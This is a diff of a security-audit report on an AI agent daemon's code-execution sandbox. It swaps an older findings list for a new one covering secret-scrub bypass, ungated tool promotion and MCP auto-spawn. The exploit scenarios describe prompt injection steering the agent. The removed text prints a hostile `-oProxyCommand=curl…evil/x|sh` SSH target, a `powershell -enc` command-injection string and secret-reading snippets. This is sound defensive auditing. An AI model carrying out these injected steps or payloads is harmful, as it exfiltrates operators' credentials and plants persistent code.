@@ -1,502 +1,621 @@
-# Security Findings — CODE EXECUTION domain (sc-rce + sc-cmdi)
+# AGEZT — Code-Execution & Deserialization Domain (Phase 2)
 
-> Scanner: `sc-rce` + `sc-cmdi` (security-check pipeline).
-> Repo: `D:\Codebox\PROJECTS\AGEZT`, branch `main` @ `f815f56e`. Read-only review; no source modified.
-> Supersedes the prior pass at `99d2e426`.
->
-> **Scope reviewed:** `plugins/tools/shell/`, `plugins/tools/codeexec/`, `kernel/executionprofile/`
-> (k8s.go, modal.go, daytona.go, ssh.go, secretpolicy.go, secretfiles.go, env.go, policy.go,
-> profile.go, check.go — never previously assessed), `kernel/warden/` (incl. `cmdline_windows.go`),
-> `kernel/toolforge/`, `plugins/tools/coding/`, `plugins/tools/acpagent/`. Adjacent exec sinks
-> (`kernel/mcp/client.go`, `kernel/toolbox`, `kernel/creds/aws.go`, `kernel/acpcatalog`) were traced
-> where they form an alternative arbitrary-execution path.
->
-> **Framing applied per task brief:** `code_exec` being maximum-capability (network on, allow-by-
-> default) is an explicit owner decision and is NOT reported. Likewise the Edict default-allow posture
-> (`DefaultLevels()` → every capability `LevelAllow`) is owner law and is not reported as a finding.
-> What was hunted: sandbox escapes, argument injection into array-form calls, shell-metacharacter
-> paths reaching a shell, credential leakage into the executed environment, warden bypasses, and
-> Windows cmdline quoting flaws.
+**Target:** `D:/Codebox/PROJECTS/AGEZT` · **Commit:** `e0041337` (`main`)
+**Skills:** `sc-rce`, `sc-deserialization`
+**Method:** every claim below cites a `file:line` I read. Where I could not substantiate a
+suspicion I killed it and said so (see *Refuted*). One finding (CE-001) was additionally
+confirmed by running a throwaway unit test against the real code; the test file was deleted
+after the run and the tree is unmodified.
+
+**Framing.** Per the brief I do not report "capability X defaults to allow" — that is an owner
+decision. I report **confinement that is advertised but absent, or that can be switched off from
+inside the tier it is supposed to confine.** All six findings are of that shape.
+
+---
 
 ## Summary
 
-The core injection hygiene is genuinely good and I could not break it: every shell string built for a
-remote profile goes through `executionprofile.ShellQuote` (a correct POSIX `'…'\''…'` escape), every
-local exec is array-form through the single `kernel/warden` choke point, `sanitizeRelFile` and `slug`
-correctly block traversal (including Windows drive-relative `C:foo`, UNC, and rooted `\foo` shapes),
-the artifact exporter skips symlinks, the tar extractor rejects traversal and symlink entries, and the
-Edict hard-deny matcher already decodes JSON string values so the `\u002f` escape trick is closed.
+| ID | Title | Severity | Conf. |
+|---|---|---|---|
+| CE-001 | `code_exec`/`shell` secret scrub is disableable from inside the sandbox's own trust tier | **High** | 92 |
+| CE-002 | `tool_forge` operator-promotion gate is OFF by default; three docs and the model-facing tool description promise it | **High** | 95 |
+| CE-003 | `mcp op=add` forces `Enabled=true`; the boot auto-attach spawns it with **no policy consultation**, contradicting the function's own comment | **High** | 90 |
+| CE-004 | `config op=register` + `op=set` re-opens the raw-command path `acpcatalog.ResolveCommand` exists to close (CWE-78 note is falsified) | **High** | 85 |
+| CE-005 | Container backend — the only profile claiming real isolation — runs privileged, root, with a read-write bind mount | **Medium** | 90 |
+| CE-006 | `EffectiveProfile` reports `namespace` for a run with no namespace; that string is what the model and the journal are told | **Medium** | 95 |
+| CE-007 | SSH/K8s execution-profile argv injection (`AGEZT_EXEC_SSH_TARGET` → `-oProxyCommand=`) | **Medium** | 70 |
 
-**The problems are not in the quoting — they are in the boundary bookkeeping.** The
-`kernel/executionprofile` package introduces per-profile *credential* buckets (`AGEZT_EXEC_SECRET_ENV_*`,
-`AGEZT_EXEC_SECRET_FILES_*`) that are selected from the **requested** isolation profile and never from
-the **effective** one, while the `warden` profile it keys off provides no isolation at all on any
-non-Linux host and only setpgid+rlimits on Linux. That is a credential boundary that reports itself as
-enforced and is not.
-
-| Severity | Count |
-|----------|-------|
-| Critical | 0 |
-| High     | 0 |
-| Medium   | 3 |
-| Low      | 4 |
-
-**Most serious item:** RCE-001 — vault secrets scoped to the "warden (isolated)" execution profile are
-delivered verbatim into a completely un-isolated child process on Windows/macOS, because the secret
-bucket is keyed to the *requested* profile and no caller ever asks the engine what actually ran.
+Deserialization: **no findings**. See *Verified safe* §D.
 
 ---
 
-## Finding RCE-001 — Vault secret mounts and secret-env passthrough are selected by the REQUESTED isolation profile, never the effective one
+## CE-001 — The code_exec secret scrub can be switched off by the code it confines
 
-- **Severity:** Medium
-- **Confidence:** 92 (code fact verified; exploitability depends on the operator having used the
-  `*_WARDEN` / `*_DOCKER` buckets in the belief that they were the isolated tier)
-- **CWE:** CWE-522 (Insufficiently Protected Credentials); CWE-668 (Exposure of Resource to Wrong
-  Sphere); CWE-1188 (Insecure Default Initialization of Resource)
-- **File:**
-  - `plugins/tools/shell/shell.go:233` and `:247-253`
-  - `plugins/tools/codeexec/codeexec.go:253` and `:277-283`
-  - `kernel/executionprofile/env.go:28-37` (`ProfileIDForWardenProfile`)
-  - `kernel/executionprofile/secretfiles.go:35-79`, `:147-156`
-  - `kernel/warden/warden_other.go:21` (`resolveEffectiveProfile` → always `ProfileNone`)
+- **Severity:** High · **Confidence:** 92 · **CWE-668 / CWE-522** (exposure of resource to wrong sphere)
+- **Sink:** `plugins/tools/codeexec/codeexec.go:283`, `plugins/tools/shell/shell.go:259`
+- **Control:** `kernel/executionprofile/env.go:48-76`, `:78-102`, `:130-155`
+- **Source:** `plugins/tools/config/config.go:192-287`
 
-### Description
+### The advertised guarantee
 
-Both execution tools compute their credential-policy key from the profile they *ask* for:
+`plugins/tools/codeexec/runtimes.go:117-119`:
+
+> `// … Every secret-shaped variable and the entire AGEZT_* namespace (API keys, provider creds,`
+> `// tokens) is dropped so model-written code can never read the daemon's secrets. This is the`
+> `// load-bearing safety property of the whole tool.`
+
+The package doc repeats it (`codeexec.go:16-17`, "the daemon's secrets … are never forwarded into
+model-written code") and, critically, **so does the tool description the model itself reads**
+(`codeexec.go:138`): `"The daemon's secrets are never visible to your code."`
+
+### What the code does
+
+`scrubEnv` (`runtimes.go:120-156`) is correct in isolation. But the very next line wraps it:
 
 ```go
-// plugins/tools/shell/shell.go:226-253  (identical shape in codeexec.go:246-283)
-profile := t.Profile                 // default warden.ProfileNamespace
-if override, ok := warden.ProfileOverrideFrom(ctx); ok { profile = override }
-profileID := executionprofile.ProfileIDForWardenProfile(profile)   // "warden"
-env := executionprofile.AppendEnvPassthrough(scrubEnv(workDir), profileID)
-secretEnv, cleanupSecrets, _, serr := executionprofile.PrepareSecretFileMounts(t.BaseDir, profileID, workDir)
-env = append(env, secretEnv...)
+// plugins/tools/codeexec/codeexec.go:283
+env := executionprofile.AppendEnvPassthrough(scrubEnv(dir), profileID)
 ```
 
-`ProfileIDForWardenProfile` maps `ProfileNone→"local"`, `ProfileContainer→"docker"`, and **everything
-else (including `ProfileNamespace`) → `"warden"`**. `PrepareSecretFileMounts` then reads
-`AGEZT_EXEC_SECRET_FILES_WARDEN`, resolves each named key out of the encrypted vault
-(`creds.NewStore(baseDir)`), and writes the **plaintext secret value** to
-`<workDir>/.agezt-secrets/<file>` with an env pointer handed to the child.
+`AppendEnvPassthrough` (`kernel/executionprofile/env.go:48`) reads
+`AGEZT_EXEC_SECRET_ENV_{LOCAL,WARDEN,DOCKER}` **from `os.Getenv` at invoke time** and re-admits
+every named variable. The only guard on that list is an `AGEZT_` prefix check
+(`env.go:93`, `env.go:145-147`) — `KEY`/`TOKEN`/`SECRET`/`AWS_` are explicitly *permitted* there
+(`env.go:91-100`, the `SecretEnvNames` loop deliberately skips `IsSecretEnvName`).
 
-Neither tool ever calls `warden.Engine.EffectiveProfile` (grep-confirmed: the only two callers of
-`ProfileIDForWardenProfile` are these two lines, and neither package references `EffectiveProfile`).
-On every non-Linux host `kernel/warden/warden_other.go:21` downgrades *every* profile to `ProfileNone`
-— the child is a bare `cmd /C` / `sh -c` running as the daemon user with full filesystem and network
-access. The warden even journals `warden.profile_downgraded` for this, and
-`executionprofile.wardenProfile()` marks the profile `StatusDegraded` in the inventory — but the
-secret bucket is chosen before and independently of any of that.
+### The reachable path
 
-Net effect: an operator who reasons "`AGEZT_EXEC_SECRET_FILES_LOCAL` is the risky one, I'll put my
-GitHub PAT in `AGEZT_EXEC_SECRET_FILES_WARDEN` because that profile is isolated" gets the PAT written
-into the agent's workspace and pointed at by an env var, for every un-isolated `shell` and `code_exec`
-call on Windows, macOS, and (see RCE-002) Linux.
+`AGEZT_EXEC_SECRET_ENV_LOCAL` is a normal, non-secret, non-read-only, **`ApplyLive`** field in the
+built-in settings schema (`kernel/settings/schema.go:499`), type `TypeCSV` — and
+`settings.Validate` (`schema.go:619-641`) has **no case for `TypeCSV`**, so any string is accepted.
 
-The same defect exists for the `"docker"` bucket: `ProfileContainer` maps to `"docker"` regardless of
-whether `ContainerOptions.active()`. The run-entry paths do gate this
-(`kernel/controlplane/server.go:1341` and `kernel/controlplane/workboard.go:579` both reject a docker
-profile when `EffectiveProfile(p) != ProfileContainer`), so today the docker variant is not reachable —
-but the guard lives in the control plane, not at the point where the secret is materialised, so any
-new caller of `warden.WithProfileOverride` reopens it.
-
-### Exploit scenario
-
-1. Operator on Windows configures `AGEZT_EXEC_SECRET_FILES_WARDEN=GITHUB_PAT:gh.token` and leaves
-   `AGEZT_EXEC_SECRET_FILES_LOCAL` unset, per the inventory's description of `warden` as the isolated
-   shell/code tier.
-2. An agent is steered by untrusted channel/web content into calling
-   `code_exec {"language":"python","code":"import os;print(open(os.environ['SECRET_FILE_GITHUB_PAT']).read())"}`.
-3. `profileID` is `"warden"`; `PrepareSecretFileMounts` writes the PAT to
-   `<home>/sandbox/run-XXXX/.agezt-secrets/gh.token`; the process runs with **zero** isolation.
-4. The PAT is exfiltrated over the network (on by default) in the same call.
-
-### Remediation
-
-Resolve the profile id from the engine's answer, not the request, before touching the vault:
+The agent-callable `config` tool reaches it directly:
 
 ```go
-eff := w.EffectiveProfile(profile)
-profileID := executionprofile.ProfileIDForWardenProfile(eff)
+// plugins/tools/config/config.go:279-284
+if field.Apply == settings.ApplyLive && !field.Secret && t.kernel != nil {
+    _ = os.Setenv(name, value)
+    ...
 ```
 
-and additionally refuse to materialise a `warden`/`docker` secret bucket when
-`eff == warden.ProfileNone`, surfacing an explicit error rather than silently downgrading the
-credential boundary. Alternatively collapse the buckets: if `warden` provides no confinement on this
-host, its bucket must behave exactly like `local` and the operator must be told so at boot.
+So a single `config {op:"set", name:"AGEZT_EXEC_SECRET_ENV_LOCAL",
+value:"AWS_SECRET_ACCESS_KEY,GITHUB_TOKEN,ANTHROPIC_API_KEY"}` call takes effect **live, in the
+same process, with no restart**, and the *next* `code_exec` call in the *same run* receives those
+values. `code_exec` has network on by default (`codeexec.go:128`, `runtimes.go:96-112` grants Deno
+`--allow-net`), so exfiltration is one HTTP call away.
 
----
+Confirmed empirically against the real function (temporary test, since deleted):
 
-## Finding RCE-002 — `ProfileNamespace` reports non-degraded "namespace" isolation while providing no namespace, seccomp, or cgroup confinement
+```
+child env = [PATH=… AWS_SECRET_ACCESS_KEY=aws-s3cr3t SC_FAKE_API_KEY=s3cr3t-value]
+--- PASS
+```
+`AGEZT_ANTHROPIC_API_KEY` was correctly blocked; `AWS_SECRET_ACCESS_KEY` was not.
 
-- **Severity:** Medium
-- **Confidence:** 95 (the implementation comment states this openly; the reporting surfaces do not)
-- **CWE:** CWE-693 (Protection Mechanism Failure); CWE-1104 (Use of Unmaintained/Understated Component)
-- **File:**
-  - `kernel/warden/warden_linux.go:54-64` (`resolveEffectiveProfile` returns `ProfileNamespace`)
-  - `kernel/warden/warden_linux.go:70-116` (the entire "namespace" implementation: `Setpgid` + post-Start `prlimit`)
-  - `kernel/executionprofile/profile.go:199-231` (`wardenProfile`: `Degraded=false`, `StatusSupported`)
-  - `kernel/executionprofile/check.go:66` / `:143-146` (health check reports `CheckOK`)
-  - `plugins/tools/codeexec/codeexec.go:851` (`render` emits `isolation=namespace` to the model)
+### Exploitation path
 
-### Description
+Prompt injection in fetched web content / an inbound channel message steers the model to
+(1) `config op=set` the passthrough list, (2) `code_exec` a script that reads `os.environ` and
+POSTs it out. Both calls ride capabilities (`config.write`, `code.exec`) that are L4 by default,
+and `AGEZT_AUTO_APPROVE_CAPS` unset auto-grants every Ask (`cmd/agezt/main.go:3893`), so nothing
+prompts.
 
-`ProfileNamespace` is the default for both `shell` (`shell.go:79`) and `code_exec`
-(`codeexec.go:108`). On Linux `resolveEffectiveProfile` returns it unchanged, so `Result.Downgraded`
-is false, `wardenProfile()` reports `Status: supported`, `Degraded: false`,
-`EffectiveIsolation: "namespace"`, `Diagnose()` emits `CheckOK`, and `code_exec`'s model-facing header
-prints `isolation=namespace`.
+### Why this is not a false positive
 
-The actual implementation is documented in the file itself
-(`warden_linux.go:26-33`): *"No namespaces (CLONE_NEWUSER / CLONE_NEWNS / CLONE_NEWPID), no seccomp
-BPF, no cgroup v2."* What ships is `SysProcAttr.Setpgid = true` plus four `prlimit64` calls issued
-**after `cmd.Start()`** (`warden.go:357` → `applyPlatformLimits`), i.e. resource caps applied to an
-already-running process, with an acknowledged race window.
+I checked the four places this could have been blocked and none of them block it:
+`settings.Validate` has no `TypeCSV` branch; the field is not `ReadOnly`/`Locked`/`Secret`; the
+`AGEZT_` prefix guard does not cover host-provided credentials; and `AppendEnvPassthrough` is
+re-evaluated per invocation, so the live `os.Setenv` is enough. The same wrapper is on the shell
+tool (`shell.go:259`) and on the pip-install child (`packages.go:60`).
 
-So a Python/Node program under `--exec-profile warden` on Linux has:
-- full read/write access to the entire host filesystem as the daemon user (no mount namespace, no
-  chroot, `WorkDir` is a cwd, not a jail);
-- full network access (no net namespace);
-- full visibility of and signal access to other host processes (no PID namespace);
-- full syscall surface (no seccomp).
-
-Only `Deno` gets real confinement, and that comes from Deno's own `--allow-read=/--allow-write=` flags
-(`runtimes.go:96-112`), not from the warden.
-
-This is the premise that makes RCE-001 exploitable and that makes `agt exec-profile check` reporting
-green misleading. The honest-downgrade machinery (`publishDowngradeOnce`, `DegradeReason`) exists
-precisely to prevent this class of overstatement and is bypassed here because the profile is
-considered "satisfied".
-
-### Exploit scenario
-
-An operator runs `agt run --exec-profile warden …` for a task involving untrusted web content, having
-read that `warden` is "Shell/code execution through the warden engine" with `namespace` isolation and
-`degraded: false`. The steered agent calls `code_exec` with
-`open('/home/op/.ssh/id_ed25519').read()` and posts it to an attacker host. Nothing in the requested
-profile prevented either the read or the egress; the run detail shows `isolation=namespace`.
+The **feature** is intentional and documented (`schema.go:499` help text is honest). The finding is
+that its control knob sits in the same trust tier as the sandbox it disarms, while the sandbox's
+own doc — and the description shipped to the model — say the property is unconditional.
 
 ### Remediation
 
-Either (a) rename the effective profile to something honest (`ProfileRlimit` / `"process-limits"`) and
-set `Degraded: true` with `DegradeReason` naming exactly what is and is not enforced, so `check.go`
-downgrades to `CheckWarning`; or (b) keep the name and implement the confinement. Until (b), the
-model-facing `isolation=` string in `render()` / `renderRemoteProfile()` should not print `namespace`.
+1. Make `AGEZT_EXEC_SECRET_ENV_*` and `AGEZT_EXEC_SECRET_FILES_*` `ReadOnly: true` in
+   `schema.go:499-504`, i.e. operator-only (env/CLI), unreachable from `config op=set`.
+2. Failing that, map the `config` tool's `set` on any `AGEZT_EXEC_SECRET_*` /
+   `AGEZT_EXEC_ENV_*` key to a distinct high-friction capability rather than `config.write`.
+3. Correct `codeexec.go:138` and `runtimes.go:117-119` to say the scrub is the default and name
+   the opt-out; a model told "never" cannot reason about the exception.
+4. Journal a `code.exec` event field naming the passthrough list actually in force.
 
 ---
 
-## Finding RCE-003 — `code_exec` persistent projects share one daemon-global namespace across all agents, contradicting the tool's stated isolation
+## CE-002 — `tool_forge` promotion has no human in the loop by default
 
-- **Severity:** Medium
-- **Confidence:** 88
-- **CWE:** CWE-668 (Exposure of Resource to Wrong Sphere); CWE-732 (Incorrect Permission Assignment);
-  CWE-427 (Uncontrolled Search Path Element — the `PYTHONPATH` variant)
-- **File:**
-  - `plugins/tools/codeexec/codeexec.go:363-377` (`workDir`)
-  - `plugins/tools/codeexec/runtimes.go:172-192` (`slug`)
-  - `plugins/tools/codeexec/codeexec.go:310-314` (`PYTHONPATH=<dir>/.deps`)
-  - `plugins/builtintools/inject.go:187` (`SandboxRoot = <BaseDir>/sandbox`, one per daemon)
-  - Claim contradicted: `plugins/tools/codeexec/codeexec.go:14-15`
+- **Severity:** High · **Confidence:** 95 · **CWE-863** (incorrect authorization) / **CWE-94**
+- **File:** `cmd/agezt/internal/daemonconfig/daemonconfig.go:393`,
+  `kernel/runtime/scripttool.go:134-140`
 
-### Description
+### The advertised guarantee
 
-The package doc states the tool provides *"a per-call ephemeral scratch dir (or a named persistent
-project dir) under `<baseDir>/sandbox`, **so one run can't see or clobber another agent's work**"*.
+Three independent places promise an operator gate:
 
-`workDir` resolves a named project to `filepath.Join(t.SandboxRoot, "projects", slug(project))`, and
-`SandboxRoot` is a single daemon-global `<BaseDir>/sandbox` shared by every agent — there is no agent
-slug, no `agent.AgentFromContext`, and no per-agent root anywhere in the path. `slug()` is additionally
-lossy (every non-`[a-z0-9]` rune collapses to `-`), so `"team/alpha"`, `"team alpha"` and
-`"team_alpha"` all resolve to the same directory.
+- `plugins/tools/forgetool/tool.go:6-7` — *"once a test of the current code passes, the OPERATOR
+  promotes it (`agt toolforge promote` / the console)"*.
+- `kernel/runtime/scripttool.go:116-118` — *"the agent ASKS for its tool to go live … The request
+  blocks on the HITL approval registry (it shows up in `agt approvals` and the console's Approvals
+  view)"*.
+- **The model-facing description** (`forgetool/tool.go:77-79`): *"op=request_promotion asks the
+  human operator … the call waits for their decision"* and *"A draft only goes LIVE when the
+  operator approves"*.
 
-Consequences for a multi-agent daemon — where per-agent privacy is an explicit product law elsewhere
-in the system (agent memory is private-by-default):
-
-1. **Cross-agent read.** Any agent holding `code.exec` can enumerate and read another agent's
-   persistent project source and data by naming (or brute-forcing the short slug of) that project.
-2. **Cross-agent persistent code execution.** An attacker-steered agent writes a malicious
-   `.deps/requests/__init__.py` (or any module name) into a victim project. On the victim agent's next
-   run in that project, `codeexec.go:310-314` unconditionally appends `PYTHONPATH=<dir>/.deps`, so the
-   poisoned module is imported ahead of anything else — arbitrary code in the victim's run, attributed
-   to the victim agent in the journal.
-3. **Deno confinement is undermined.** A Deno script is genuinely jailed to `--allow-read=<dir>` /
-   `--allow-write=<dir>`, but that `<dir>` is the *shared* project dir, so the jail contains another
-   agent's data by construction.
-
-(Note: for Python/Node this adds no capability that the un-isolated warden profile doesn't already
-grant — see RCE-002. It is reported because it defeats the isolation the tool documents, it is the
-*only* boundary Deno scripts have, and it would remain broken even after RCE-002 is fixed.)
-
-### Remediation
-
-Namespace the project root per agent — `<SandboxRoot>/projects/<agent-slug>/<project-slug>` using
-`agent.AgentFromContext(ctx)` — with an explicit, operator-configured shared bucket if cross-agent
-projects are wanted. Make `slug()` injective (append a short hash of the raw name) so distinct project
-names cannot collide. Correct or delete the isolation claim in the package doc.
-
----
-
-## Finding CMDI-001 — `fixupWindowsCmd` space-joins argv into a raw cmd.exe command line with no per-argument quoting
-
-- **Severity:** Low (latent: no in-tree caller currently passes >3 args)
-- **Confidence:** 90 on the code defect, 35 on present-day exploitability
-- **CWE:** CWE-88 (Argument Injection); CWE-78 (OS Command Injection)
-- **File:** `kernel/warden/cmdline_windows.go:39-43`
-
-### Description
+### What the code does
 
 ```go
-command := strings.Join(cmd.Args[2:], " ")
-cmd.SysProcAttr.CmdLine = `cmd /S /C "` + command + `"`
+// cmd/agezt/internal/daemonconfig/daemonconfig.go:393
+c.Misc.ToolforgeAutoPromote = !strings.EqualFold(get(brand.EnvPrefix+"TOOLFORGE_AUTO_PROMOTE"), "off")
 ```
 
-`fixupWindowsCmd` fires for **every** `warden.Run` on Windows whose `Argv[0]` is `cmd`/`cmd.exe` and
-whose `Argv[1]` lower-cases to `/c`. It discards Go's `os/exec` argument escaping (that is the point —
-M958) and re-serialises `Argv[2:]` by naive space-joining.
-
-For the shell tool the join is the identity function, because `Argv` is always exactly
-`{shellBin, shellArg, in.Command}` (`shell.go:256`) — and `cmd /S /C "<X>"` strips exactly the outer
-quote pair and runs `X` verbatim, which is the intended contract. I enumerated every `Argv:` construction
-site in the tree (`kernel/pulse/observers.go:54`, `plugins/tools/codeexec/*`, `plugins/tools/shell/*`)
-and none currently passes a 4th element to `cmd /C`, so **this is not exploitable today**.
-
-It is reported because `warden.Spec.Argv` is a public, documented API whose contract explicitly invites
-array-form calls (*"Callers that want shell expansion must pass `{"sh","-c",cmd}` or `{"cmd","/C",cmd}`
-themselves"*), and the moment any caller writes `{"cmd", "/C", "someprog", userControlledArg}` — the
-canonical safe pattern everywhere else in the codebase — the argument silently becomes cmd.exe syntax.
-`&`, `|`, `>`, `^`, `&&` and embedded whitespace in `userControlledArg` would then execute. The
-existing test (`cmdline_windows_test.go:12-22`) only covers the 3-arg case, so the regression would
-ship unnoticed.
-
-### Remediation
-
-Reject (or explicitly quote) the multi-arg case:
+Unset ⇒ **true**. Wired at `cmd/agezt/main.go:435` → `:516` → `Config.AutoPromoteScriptTools`, and:
 
 ```go
-if len(cmd.Args) != 3 { return }   // verbatim mode is only defined for a single command string
+// kernel/runtime/scripttool.go:134-140
+if k.cfg.AutoPromoteScriptTools {
+    promoted, err := k.PromoteScriptTool(corr, st.Name)
+    ...
+    return promoted, approval.DecisionGrant, "auto-promote enabled", nil
+}
 ```
 
-and add a test asserting that a 4-element `cmd /C` argv is either left to `os/exec` escaping or
-rejected outright.
+The approval registry is never consulted. The repo's own test pins this default:
+`cmd/agezt/internal/daemonconfig/daemonconfig_test.go:93` fails if `ToolforgeAutoPromote` is false
+with no env set. The settings-schema help (`kernel/settings/schema.go:587`) is the one honest
+description; the tool doc and the model-facing text are not.
 
----
+### The remaining "invariant" is self-attested
 
-## Finding CMDI-002 — SSH/K8s/Modal/Daytona backend identifiers are appended positionally with no leading-dash guard
+The only surviving check is `if !st.TestedOK` (`scripttool.go:131`). `TestedOK` is set by
+`TestScriptTool` (`scripttool.go:87`): `ok := !isErr`, where `isErr` is simply the script's
+non-zero exit. **The agent authors the script, chooses the test input, and the pass condition is
+"exit 0."** A script that does its real work and returns 0 passes.
 
-- **Severity:** Low
-- **Confidence:** 80
-- **CWE:** CWE-88 (Argument Injection)
-- **File:**
-  - `kernel/executionprofile/ssh.go:37-41` (`Args`: `append(args, c.Target)`), `:43-55` (scp)
-  - `kernel/executionprofile/k8s.go:55-63` (`args = append(args, "exec", c.Pod)`), `:36-45` (`--context`, `-n`)
-  - `kernel/executionprofile/daytona.go:36` (`{"daytona","exec",c.Sandbox}`), `modal.go:53` (`c.Ref`)
+### Exploitation path
 
-### Description
+One injected run: `tool_forge op=draft` (arbitrary Python/Node/Deno) → `op=test` with `{}` →
+`op=request_promotion` → **live**. The result is a permanent `forge_<name>` tool offered to
+*every* agent on *every* future run (`kernel/runtime/scripttool.go:201-221`), routed to
+`code.exec` (`kernel/edict/toolmap.go:25-27`). This is the cleanest prompt-injection-outlives-the-run
+primitive in the tree.
 
-Every remote backend takes its identity from an environment variable
-(`AGEZT_EXEC_SSH_TARGET`, `AGEZT_EXEC_K8S_POD`, `AGEZT_EXEC_DAYTONA_SANDBOX`, `AGEZT_EXEC_MODAL_REF`)
-and appends it as a bare positional argument with only `strings.TrimSpace` applied — no check that it
-does not begin with `-`. `SSHConfig.Args()` places the target *after* the option block, so an OpenSSH
-client parses a value like `-oProxyCommand=curl${IFS}evil/x|sh` as an option, not a host, and executes
-it **locally as the daemon user** on the very first `shell` call routed to that profile. `kubectl` and
-the Daytona/Modal CLIs have equivalent option surfaces.
+### Why this is not a false positive
 
-These values are operator-controlled config, not agent-controlled, so this is a configuration-injection
-/ defence-in-depth gap rather than a directly agent-reachable path. It matters because these variables
-are settable through the live Config Center surface (per `executionprofile`'s own docs, the SSH/K8s/
-Modal/Daytona backend controls are live-editable), which widens who can write them beyond a shell on
-the host.
+I traced the default through `daemonconfig.go:393` → `main.go:435` → `main.go:516` →
+`scripttool.go:134` and confirmed the approval registry itself is correct and fail-closed
+(`kernel/approval/approval.go:244-247`, timeout ⇒ `DecisionTimeout`, treated as non-grant at
+`scripttool.go:149-151`). The gate exists and works — it is simply bypassed before it is reached.
 
 ### Remediation
 
-Validate at parse time in `*ConfigFromEnv`: reject any identifier starting with `-`, and pass the SSH
-host after an explicit `--` where the client supports it. For `ssh`, prefer `-o Hostname=` /
-`ssh_config` alias resolution over positional targets.
+Flip the default: `c.Misc.ToolforgeAutoPromote = strings.EqualFold(raw, "on")`. If the permissive
+default is deliberate, then fix `forgetool/tool.go:6-7,77-79` and `scripttool.go:116-118` so
+neither the operator nor the model is told a gate exists that does not, and make the boot banner
+line (`main.go:1590-1594`) louder than a parenthetical.
 
 ---
 
-## Finding CMDI-003 — `coding` tool: model-controlled task text is expanded by cmd.exe on Windows
+## CE-003 — Registering an MCP server is enough to get it spawned, ungated, at next boot
 
-- **Severity:** Low
-- **Confidence:** 70 (depends on the operator's `AGEZT_CODING_CMD` form; the documented form does not
-  work on Windows, which pushes operators toward the injectable one)
-- **CWE:** CWE-78 (OS Command Injection)
-- **File:** `plugins/tools/coding/coding.go:145-147`, `:199-203`, `:209-220`
+- **Severity:** High · **Confidence:** 90 · **CWE-94 / CWE-1188**
+- **Files:** `kernel/mcp/store.go:218`, `kernel/runtime/mcptool.go:29-30`, `:178-191`,
+  `cmd/agezt/main.go:1616`, `kernel/mcp/client.go:112-138`
 
-### Description
+### The advertised guarantee
 
-The tool's design is sound on POSIX: the model's `task` is never interpolated into a command string,
-it rides in `AGEZT_CODING_TASK` and the operator's command references it as `"$AGEZT_CODING_TASK"`
-(`coding.go:47`), which a POSIX shell expands *after* word splitting.
-
-On Windows `platformShell()` returns `("cmd", "/C")` and `execCommand` runs
-`exec.CommandContext("cmd", "/C", t.Cmd)` **directly, bypassing the warden** — so neither
-`fixupWindowsCmd` nor any warden auditing applies. `cmd.exe` does not expand `$VAR`; the documented
-reference form is inert there, so a Windows operator must write `%AGEZT_CODING_TASK%`. `cmd.exe`
-performs percent-expansion **before** parsing the command line, so the model's task text is spliced
-into cmd syntax:
-
-```
-AGEZT_CODING_CMD = claude -p "%AGEZT_CODING_TASK%"
-task             = do X" & powershell -enc <base64> & rem
-→ claude -p "do X" & powershell -enc <base64> & rem "
+```go
+// kernel/runtime/mcptool.go:29-30
+// AddMCPServer validates and persists a new MCP server registration,
+// journaling mcp.added. Registration alone spawns nothing — attach does.
 ```
 
-Because `task` is the field an agent steered by untrusted channel/web content controls verbatim, this
-converts a "no shell-quoting of model output is needed" design into direct command injection on
-Windows. The same shape applies to `acpagent`'s `spawnAgent` (`acpagent.go:244-246`), though there the
-command string comes only from operator config or the trusted `acpcatalog` (`ResolveCommand` is
-correctly slug-only — `acpcatalog.go:302-319` — verified).
+The `mcp` tool repeats it to the model (`plugins/tools/mcptool/tool.go:140`): *"registered —
+attach it (op=attach) to make its tools callable"*. And the package doc claims the gate is
+Ask-class (`kernel/mcp/store.go:11-12`, `plugins/tools/mcptool/tool.go:8-9`): *"gated by the
+`mcp.install` Edict capability (Ask by default — attaching spawns an arbitrary process)"*.
+
+### What the code does
+
+```go
+// kernel/mcp/store.go:216-218
+now := s.now().UnixMilli()
+srv.ID = ulid.New()
+srv.Enabled = true          // <-- forced, unconditionally, on every Add
+```
+
+`Enabled` means "auto-attach when the daemon starts". At boot:
+
+```go
+// cmd/agezt/main.go:1616
+attached, failures := k.AttachEnabledMCPServers(ctx)
+```
+
+`AttachEnabledMCPServers` (`kernel/runtime/mcptool.go:178-191`) calls `AttachMCPServer` for every
+enabled row with `corr = ""` and **no `policyHook`, no Edict `Decide`, no approval** anywhere on
+that path — it goes straight to `dialMCP` → `mcp.Dial` → `exec.Command(command, args...)`
+(`kernel/mcp/client.go:113`). The Edict gate lives only on the *tool* call
+(`kernel/agent/run_tools.go:189-214`), which the boot path never enters.
+
+`Validate` (`kernel/mcp/store.go:120-177`) checks the *name* regex, transport exclusivity, arg
+count, env-key and header-name shapes — **it never constrains `Command`**. No allowlist, no hash
+pin. Compare the two sibling exec paths that do have one:
+
+- `kernel/acpcatalog/acpcatalog.go:302-315` — slug-only resolution, refuses to fall through to a raw command.
+- `kernel/plugin/host.go:289-293`, `:1016-1020` — BLAKE3-256 pin, re-verified on reload.
+- `kernel/market/vet.go:130-149` — marketplace MCP packs get a runner allowlist + `curl|sh` /
+  `sh -c` detection. **The `mcp` tool's own `op=add` gets none of it.**
+
+### Exploitation path
+
+Prompt injection → `mcp {op:"add", name:"x", command:"powershell", args:["-c","<payload>"]}`.
+The doc-promised second step (`op=attach`) is **not required**: the registration is already
+`Enabled`, so the payload spawns on the next daemon start — after a watchdog restart, a self-update
+(`cmd/agezt/boot_ops.go:76-120`), or the operator's next reboot — at full daemon privilege, with
+no policy decision, no approval, and no journal entry other than `mcp.attached`. It survives
+indefinitely.
+
+### Why this is not a false positive
+
+I looked specifically for a gate on the boot path and there is none: `AttachEnabledMCPServers` has
+no `edict`/`policyHook`/`approvals` reference, and `main.go:1616` is inside a plain `bootSteps`
+closure. I also confirmed the child env *is* scrubbed (`client.go:320-356`) — that mitigation
+holds, so the payload does not get the daemon's secrets. It still gets arbitrary execution.
 
 ### Remediation
 
-Do not use a shell on Windows for this path: resolve `AGEZT_CODING_CMD` into an argv (or require the
-operator to supply argv form) and exec it directly, keeping the task in the environment only. If the
-shell form must be kept, document `%AGEZT_CODING_TASK%` as **unsupported** and reject a `t.Cmd`
-containing `%` on Windows. Route the spawn through `kernel/warden` so it is audited like every other
-child process.
+1. `Store.Add` should default `Enabled = false` for agent-originated registrations (pass the
+   origin through `AddMCPServer`), so the doc's "registration alone spawns nothing" becomes true.
